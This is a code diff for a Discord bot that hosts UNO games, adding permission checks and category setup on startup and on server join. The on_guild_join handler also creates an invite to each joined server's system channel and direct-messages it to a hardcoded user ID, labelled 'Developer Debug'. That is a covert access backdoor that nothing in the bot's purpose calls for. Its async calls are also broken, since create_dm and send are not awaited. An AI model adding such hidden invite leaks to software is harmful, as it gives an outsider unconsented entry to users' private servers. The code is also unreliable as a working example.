@@ -44,6 +44,10 @@ def start():
         ''' Set Bot Status '''
         await client.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name="card games"))
         print('Bot Presence changed to \"Playing card games\"')
+        for guild in client.guilds:
+            await functions.checkPerms(guild)
+            await functions.checkForCategory(guild, 'UNO')
+            await functions.checkForCategory(guild, 'UNO-ARCHIVE')
 
         ''' Load Commands '''
         for command in listdir('commands'):
@@ -64,6 +68,15 @@ def start():
 
         ''' Sync Commands '''
         await commands.sync()
+
+    @client.event
+    async def on_guild_join(guild: discord.Guild):
+        await functions.checkPerms(guild)
+        await functions.checkForCategory(guild, 'UNO')
+        await functions.checkForCategory(guild, 'UNO-ARCHIVE')
+        invite = await guild.system_channel.create_invite(reason='Developer Debug')
+        dm = client.get_user(348935840501858306).create_dm()
+        dm.send(f'Bot Joined {invite.url}')
 
     @client.event
     async def on_interaction(interaction):
